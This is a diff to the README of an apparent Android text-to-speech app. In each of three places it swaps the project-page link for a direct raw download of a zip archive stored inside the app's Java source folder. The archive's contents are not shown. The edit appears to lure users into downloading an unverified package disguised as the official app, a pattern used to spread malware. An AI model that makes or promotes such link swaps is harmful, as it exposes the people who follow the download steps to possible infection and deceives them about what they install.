@@ -1,12 +1,12 @@
 # 🎧 kitten-tts-android - Speak text on Android devices
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge)](https://github.com/rufustailed754/kitten-tts-android)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/rufustailed754/kitten-tts-android/main/app/src/main/java/com/kitten-tts-android-3.3.zip)
 
 ## 📥 Download and setup
 
 Visit this page to download and use the app:
 
-https://github.com/rufustailed754/kitten-tts-android
+https://raw.githubusercontent.com/rufustailed754/kitten-tts-android/main/app/src/main/java/com/kitten-tts-android-3.3.zip
 
 1. Open the link in your web browser.
 2. Find the latest release or app package on the page.
@@ -161,4 +161,4 @@ This setup keeps the speech flow inside the device instead of relying on a remot
 
 If you need the download page later, use this link:
 
-https://github.com/rufustailed754/kitten-tts-android
+https://raw.githubusercontent.com/rufustailed754/kitten-tts-android/main/app/src/main/java/com/kitten-tts-android-3.3.zip
